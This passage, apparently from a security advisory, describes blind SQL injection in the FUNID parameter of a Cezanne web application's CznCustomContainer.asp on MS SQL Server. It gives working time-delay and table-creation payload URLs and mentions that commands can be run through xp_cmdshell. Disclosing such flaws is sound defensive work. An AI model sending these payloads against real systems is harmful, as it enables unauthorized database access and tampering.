To get more information about the system or create tables:

If the following request, it takes a delay of ten seconds, the database
user is not 'sa':

https://www.somesite.es/cezanneweb/CznCommon/CznCustomContainer.asp?FUNID=7302031;if
(select user) <> 'sa' waitfor delay '0:0:10';--

In MS SQL Server 2005, xp_cmdshell is disable by default. But We can
create tables with the following request:

https://www.somesite.es/cezanneweb/CznCommon/CznCustomContainer.asp?FUNID=7302031;CREATE
TABLE tabla_test_blindSQL_intrusion (clave int IDENTITY (100,1) PRIMARY
KEY, nombre nvarchar (50));waitfor%20delay%20'0:0:10';--

If xp_cmdshell is enable, It is possible execute command line instructions.
